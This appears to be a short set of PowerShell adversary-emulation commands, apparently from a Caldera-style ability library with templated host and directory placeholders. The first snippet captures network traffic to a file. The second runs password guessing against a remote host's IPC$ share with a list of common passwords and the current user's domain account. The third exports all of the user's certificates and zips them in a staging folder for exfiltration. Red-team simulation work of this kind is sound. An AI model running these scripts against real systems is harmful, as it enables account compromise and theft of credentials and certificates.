scripts.command:
$path = "$ENV:UserProfile\Desktop\pcap.etl";
New-NetEventSession -Name "PCAP" -CaptureMode SaveToFile -LocalFilePath $path;
Add-NetEventProvider -Name "Microsoft-Windows-TCPIP" -SessionName "PCAP";
Start-NetEventSession -Name "PCAP";
Start-Sleep -s 60;
Stop-NetEventSession -Name "PCAP";
if (Test-Path $path) {
  echo $path;
  exit 0;
} else {
  echo "Failed to generate PCAP file.";
  exit 1;
};

echo Password1 > passwords.txt;
echo 1q2w3e4r >> passwords.txt;
echo Password! >> passwords.txt;
echo Spring2022 >> passwords.txt;
echo ChangeMe! >> passwords.txt;
foreach($passw in Get-Content ".\passwords.txt") {
  net use '\\#{stockpile_credaccess_1110_001_remote_host_fqdn}\IPC$' /user:"$env:USERDNSDOMAIN\$env:USERNAME" "$passw" 1>$null 2>&1;
  if ($?) {
    echo [*] "$env:USERNAME : $passw";
    net use /delete '\\#{stockpile_credaccess_1110_001_remote_host_fqdn}\IPC$';
    break;
  }
}

$archive="#{stockpile_credaccess_1649_host_dir_staged}\atomic_certs.zip";
$exfilpath="#{stockpile_credaccess_1649_host_dir_staged}\certs";
Add-Type -assembly "system.io.compression.filesystem";
Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore;
mkdir $exfilpath | Out-Null;
foreach ($cert in (gci Cert:\CurrentUser\My)) {
  Export-Certificate -Cert $cert -FilePath $exfilpath\$($cert.FriendlyName).cer
}
[io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)
